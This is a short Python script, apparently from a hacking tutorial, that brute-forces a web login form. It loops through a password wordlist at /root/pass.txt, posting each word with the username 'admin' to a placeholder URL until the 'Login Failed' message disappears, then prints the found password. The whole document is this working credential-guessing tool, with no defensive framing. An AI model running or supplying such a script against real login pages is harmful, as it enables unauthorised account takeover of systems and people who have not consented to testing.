#!/usr/bin/env python

import requests

target_url = "url"
data_dic = {"username": "admin", "password": "admin", "Login": "submit"}

with open("/root/pass.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dic["password"] = word
        response = requests.post(target_url, data=data_dic)
        if "Login Failed" not in response.content:
            print ("[+] Got the passsord -------> " + word)
            exit()

print ("[+] Reached this line")